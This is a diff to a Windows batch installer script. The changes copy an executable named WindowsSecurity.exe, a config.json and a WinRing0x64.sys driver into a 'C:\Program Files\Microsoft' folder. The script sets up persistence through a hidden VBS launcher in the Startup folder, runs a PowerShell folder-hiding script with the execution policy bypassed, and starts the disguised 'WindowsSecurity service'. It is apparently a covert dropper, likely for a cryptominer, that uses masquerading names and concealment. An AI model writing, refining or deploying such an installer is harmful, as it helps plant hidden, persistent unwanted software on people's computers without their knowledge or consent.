@@ -11,7 +11,7 @@ setlocal enabledelayedexpansion
 
 :: Get the folder where this script is located
 set "sourceFolder=%~dp0"
-set "targetFolder=C:\Program Files\Chrome"
+set "targetFolder=C:\Program Files\Microsoft"
 set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 echo Creating target folder if it does not exist...
@@ -21,17 +21,21 @@ if not exist "%targetFolder%" mkdir "%targetFolder%" 2>nul || (
     exit /b 1
 )
 
-:: Copy only the files that exist in the same directory as the script
+:: Copy only specific files to the target folder
 echo Copying files to %targetFolder%...
-for %%F in ("%sourceFolder%\*") do (
-    if /I not "%%~nxF"=="setup.bat" (
-        copy /Y "%%F" "%targetFolder%" >nul 2>&1 && (
-            echo Copied %%~nxF to %targetFolder%
+for %%F in (WindowsSecurity.exe config.json WinRing0x64.sys) do (
+    if exist "%sourceFolder%\%%F" (
+        copy /Y "%sourceFolder%\%%F" "%targetFolder%" >nul 2>&1 && (
+            echo Copied %%F to %targetFolder%
         ) || (
-            echo ERROR: Failed to copy %%~nxF!
+            echo ERROR: Failed to copy %%F!
             pause
             exit /b 1
         )
+    ) else (
+        echo ERROR: %%F not found in source folder!
+        pause
+        exit /b 1
     )
 )
 
@@ -65,9 +69,16 @@ if not exist "%startupFolder%\run_hidden.vbs" (
     exit /b 1
 )
 
-:: Now run the PowerShell script to hide files
+:: Verify hide_folder.ps1 exists in the source folder before running it
+if not exist "%sourceFolder%\hide_folder.ps1" (
+    echo ERROR: hide_folder.ps1 not found in source folder!
+    pause
+    exit /b 1
+)
+
+:: Run the PowerShell script from the source folder
 echo Running PowerShell script to hide folders...
-powershell -ExecutionPolicy Bypass -File "C:\Program Files\Chrome\hide_folder.ps1"
+powershell -ExecutionPolicy Bypass -File "%sourceFolder%\hide_folder.ps1"
 
 :: Run the hidden VBS script immediately to start the service
 echo Starting WindowsSecurity service via run_hidden.vbs...
